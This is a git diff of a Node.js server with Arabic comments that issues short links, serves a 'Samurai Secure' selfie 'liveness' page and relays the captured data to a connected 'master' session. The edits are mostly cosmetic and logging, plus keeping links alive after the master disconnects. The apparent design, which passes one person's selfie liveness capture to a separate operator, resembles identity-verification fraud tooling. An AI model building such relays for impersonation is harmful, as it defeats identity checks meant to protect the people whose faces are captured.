@@ -1,6 +1,6 @@
 const WebSocket = require('ws');
 const http = require('http');
-const crypto = require('crypto'); // 🔥 إضافة مكتبة التشفير لضمان عدم تطابق الروابط نهائياً
+const crypto = require('crypto'); // 🔥 مكتبة التشفير لضمان عدم تطابق الروابط نهائياً
 
 const PORT = process.env.PORT || 8080;
 
@@ -9,6 +9,7 @@ const masters = {};
 const sessionsDB = {}; 
 
 const server = http.createServer((req, res) => {
+    // إعدادات CORS للسماح بالاتصال من أي مصدر
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -28,7 +29,7 @@ const server = http.createServer((req, res) => {
                     let shortId;
                     // 🔥 حلقة تأمين: توليد كود مشفر، والتأكد 100% أنه غير موجود مسبقاً لمنع الاختلاط
                     do {
-                        shortId = crypto.randomBytes(3).toString('hex'); // يولد كود من 6 أحرف مثل "a1b2c3"
+                        shortId = crypto.randomBytes(3).toString('hex'); // يولد كود من 6 أحرف
                     } while (sessionsDB[shortId]); 
 
                     sessionsDB[shortId] = data.session;
@@ -83,17 +84,18 @@ const server = http.createServer((req, res) => {
             res.end();
         } else {
             res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
-            res.end('<h2 style="text-align:center; color:red;">الرابط غير صالح</h2>');
+            res.end('<h2 style="text-align:center; color:red; font-family:sans-serif; margin-top:50px;">الرابط غير صالح أو انتهت صلاحيته</h2>');
         }
         return;
     }
 
     // ==========================================
-    // 3. مراقبة السيلفي (عزل حسب الـ Session ID)
+    // 3. مراقبة السيلفي (استقبال غير محدود لدعم إعادة المحاولة)
     // ==========================================
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-        res.end('<html><head><title>Samurai Secure</title></head><body id="samurai-canvas"></body></html>');
+        // تم إضافة خلفية سوداء هنا لتتناسب مع التصميم
+        res.end('<html><head><title>Samurai Secure</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body id="samurai-canvas" style="background:#050507;"></body></html>');
         return;
     }
 
@@ -105,7 +107,7 @@ const server = http.createServer((req, res) => {
                 const data = JSON.parse(body);
                 const targetSession = data.session_id; 
 
-                // بحث دقيق عن الماستر المرتبط بهذه الجلسة فقط (لا يمكن أن يرسل لغيره)
+                // بحث دقيق عن الماستر المرتبط بهذه الجلسة فقط (الآن يدعم رسائل متعددة للريتراي)
                 if (targetSession && masters[targetSession]) {
                     const masterWs = masters[targetSession];
                     
@@ -150,6 +152,7 @@ wss.on('connection', (ws) => {
             if (data.type === 'REGISTER_MASTER' && data.session_id) {
                 mySessionId = data.session_id;
                 masters[mySessionId] = ws; // ربط السوكيت بالجلسة بدقة متناهية
+                console.log(`👨‍💻 [MASTER CONNECTED] Active Masters: ${Object.keys(masters).length}`);
             }
         } catch(e) {}
     });
@@ -157,14 +160,10 @@ wss.on('connection', (ws) => {
     ws.on('close', () => {
         if (mySessionId && masters[mySessionId]) {
             delete masters[mySessionId]; // تنظيف الذاكرة فوراً لتخفيف الضغط
+            console.log(`🔌 [MASTER DISCONNECTED] Active Masters: ${Object.keys(masters).length}`);
             
-            // 🔥 مسح الرابط القصير من الذاكرة إذا أغلق الماستر (اختياري لزيادة الأمان وتخفيف الـ RAM)
-            for (let shortId in sessionsDB) {
-                if (sessionsDB[shortId] === mySessionId) {
-                    delete sessionsDB[shortId];
-                    break;
-                }
-            }
+            // 🛑 [تم حذف كود إزالة الرابط من الذاكرة (sessionsDB) من هنا] 🛑
+            // السبب: لكي نسمح لك بعمل Refresh لصفحتك كـ ماستر بدون أن ينكسر الرابط عند العميل.
         }
     });
 });
